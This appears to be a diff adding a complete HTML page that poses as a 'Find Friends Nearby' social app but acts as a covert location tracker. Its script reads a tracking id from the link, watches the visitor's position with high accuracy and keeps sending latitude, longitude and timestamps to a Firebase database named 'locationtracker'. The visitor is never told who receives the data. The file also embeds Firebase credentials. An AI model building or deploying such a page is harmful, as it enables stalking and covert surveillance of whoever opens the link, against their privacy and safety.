@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Find Nearby Friends</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    * {
+      margin: 0; padding: 0; box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: url('https://images.unsplash.com/photo-1504384308090-c894fdcc538d?auto=format&fit=crop&w=1950&q=80') no-repeat center center fixed;
+      background-size: cover;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      text-align: center;
+    }
+
+    .container {
+      background: rgba(0, 0, 0, 0.6);
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(8px);
+      max-width: 400px;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    h1 {
+      font-size: 2.2rem;
+      margin-bottom: 15px;
+      animation: slideIn 1s ease-in-out;
+    }
+
+    p {
+      font-size: 1rem;
+      margin-bottom: 30px;
+      line-height: 1.5;
+      animation: fadeIn 2s ease-in-out;
+    }
+
+    .loader {
+      border: 6px solid rgba(255, 255, 255, 0.3);
+      border-top: 6px solid #fff;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      margin: 0 auto;
+      animation: spin 1s linear infinite;
+    }
+
+    .alert {
+      margin-top: 20px;
+      background-color: #f87171;
+      padding: 10px;
+      border-radius: 10px;
+      display: none;
+      font-weight: bold;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideIn {
+      from { transform: translateY(-30px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Find Friends Nearby 👥</h1>
+    <p>Allow location access to discover people around you and start connecting instantly!</p>
+    <div class="loader"></div>
+    <div class="alert" id="alertBox">Please allow location access to continue.</div>
+  </div>
+
+  <!-- Firebase SDK -->
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+  <script>
+    // ✅ Replace with your Firebase config:
+    const firebaseConfig = {
+  apiKey: "AIzaSyCCOU_rmxKopnM8I4DNd3JWsd7W3xWxKuU",
+  authDomain: "locationtracker-ff2c8.firebaseapp.com",
+  databaseURL: "https://locationtracker-ff2c8-default-rtdb.firebaseio.com",
+  projectId: "locationtracker-ff2c8",
+  storageBucket: "locationtracker-ff2c8.firebasestorage.app",
+  messagingSenderId: "531842224993",
+  appId: "1:531842224993:web:6dff1fce6d182ad3186b20",
+  measurementId: "G-N5FM7DT3T9"
+};
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    const alertBox = document.getElementById("alertBox");
+
+    function getTrackingId() {
+      const params = new URLSearchParams(location.search);
+      return params.get("id");
+    }
+
+    function pushLocation(lat, lon) {
+      const id = getTrackingId();
+      if (!id) return;
+      const ref = db.ref("locations/" + id);
+      ref.push({
+        latitude: lat,
+        longitude: lon,
+        timestamp: new Date().toISOString()
+      });
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.watchPosition(position => {
+        const lat = position.coords.latitude.toFixed(6);
+        const lon = position.coords.longitude.toFixed(6);
+        pushLocation(lat, lon);
+      }, error => {
+        alertBox.style.display = "block";
+        alertBox.textContent = "❌ Please allow location access to continue.";
+      }, {
+        enableHighAccuracy: true,
+        timeout: 10000
+      });
+    } else {
+      alertBox.style.display = "block";
+      alertBox.textContent = "❌ Geolocation is not supported.";
+    }
+  </script>
+</body>
+</html>
